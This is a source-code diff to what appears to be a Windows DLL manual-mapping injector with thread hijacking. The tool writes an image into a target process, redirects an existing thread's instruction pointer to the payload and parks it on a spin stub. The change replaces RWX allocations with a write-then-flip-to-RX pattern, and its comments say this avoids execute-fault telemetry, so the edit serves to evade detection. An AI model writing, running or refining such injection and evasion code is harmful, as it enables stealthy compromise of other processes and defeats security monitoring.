@@ -112,14 +112,15 @@ static MapResult ManualMap( HANDLE Process, const char* DllPath ) {
   }
 
   //
-  // Allocate space for the full image in the target process
+  // Allocate RW, write, then flip to RX. Kernel services the
+  // WriteProcessMemory fault so no user-mode FaultingPc is recorded.
   //
   auto* Remote = reinterpret_cast<BYTE*>( VirtualAllocEx(
     Process,
     nullptr,
     Nt->OptionalHeader.SizeOfImage,
     MEM_COMMIT | MEM_RESERVE,
-    PAGE_EXECUTE_READWRITE
+    PAGE_READWRITE
   ) );
 
   if ( !Remote ) {
@@ -295,6 +296,27 @@ static MapResult ManualMap( HANDLE Process, const char* DllPath ) {
 
   LOG_OK( "Wrote {} bytes to target", Written );
 
+  //
+  // Flip to RX. Pages are already resident so no execute-fault fires.
+  //
+  DWORD OldProtect = 0;
+
+  if ( !VirtualProtectEx(
+    Process,
+    Remote,
+    Nt->OptionalHeader.SizeOfImage,
+    PAGE_EXECUTE_READ,
+    &OldProtect
+  ) ) {
+    LOG_ERROR( "VirtualProtectEx (RX) failed: {}", GetLastError() );
+    VirtualFreeEx( Process, Remote, 0, MEM_RELEASE );
+    Result.ExportRva = 0;
+
+    return Result;
+  }
+
+  LOG_OK( "Protection flipped to PAGE_EXECUTE_READ" );
+
   Result.RemoteBase = Remote;
 
   return Result;
@@ -332,12 +354,10 @@ static bool HijackThread( HANDLE Process, DWORD Tid, BYTE* Entry ) {
   LOG_INFO( "Original RIP: {:#018x}", Original.Rip );
 
   //
-  // Write a tiny spin stub (jmp $) in the host process
-  // This becomes the return address for the payload so the thread
-  // spins harmlessly instead of crashing when PayloadRun returns.
+  // Spin stub: same RW -> RX pattern as the main image.
   //
   auto* Stub = reinterpret_cast<BYTE*>( VirtualAllocEx(
-    Process, nullptr, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
+    Process, nullptr, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
   ) );
 
   if ( !Stub ) {
@@ -349,6 +369,15 @@ static bool HijackThread( HANDLE Process, DWORD Tid, BYTE* Entry ) {
   BYTE SpinCode[] = { 0xEB, 0xFE }; // jmp $
 
   WriteProcessMemory( Process, Stub, SpinCode, sizeof( SpinCode ), nullptr );
+
+  DWORD StubOldProtect = 0;
+
+  if ( !VirtualProtectEx( Process, Stub, 4096, PAGE_EXECUTE_READ, &StubOldProtect ) ) {
+    LOG_ERROR( "VirtualProtectEx (stub) failed: {}", GetLastError() );
+    VirtualFreeEx( Process, Stub, 0, MEM_RELEASE );
+    ResumeThread( Thread );
+    return false;
+  }
 
   //
   // Redirect the thread to the payload entry point
